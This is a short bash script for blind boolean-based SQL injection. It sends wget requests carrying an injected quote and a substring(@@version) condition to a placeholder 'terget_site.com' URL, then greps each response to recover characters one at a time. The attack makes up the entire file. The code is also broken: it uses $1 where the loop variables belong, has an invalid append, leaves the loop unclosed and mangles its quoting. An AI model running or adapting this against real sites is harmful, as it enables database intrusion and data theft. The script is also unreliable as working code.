#!/bin/bash

charset=`echo {0..9} {A..z} \. \: \, \; \- \_ \@`

export URL="http://terget_site.com/vulnerable" # or vulnerable.php/vuln.html etc
export truestring="string on html page that match weather it it true condition"
export maxlength=$1

export result="" # length of character , input on command line 
# bash blind.sh 10 // if this is 10 charater long string
for ((j=1;j<maxlength; j+=1))
do
    export nthchar=$j
    for i in $charset
    do
# URL?something.php=adrianalvird' ,  adding a quote and inject a sql
        wget "$URL?parameter_name=parameter_input' and substring(@@version,1,1)="$1" -q -O - | grep "$truestring" &> /dev/null    
        if [ "$?" == "0" ]
        then
            echo Character Number $nthchar found: $1
            export result +=$i
            break
        fi
    done
echo Result: $result
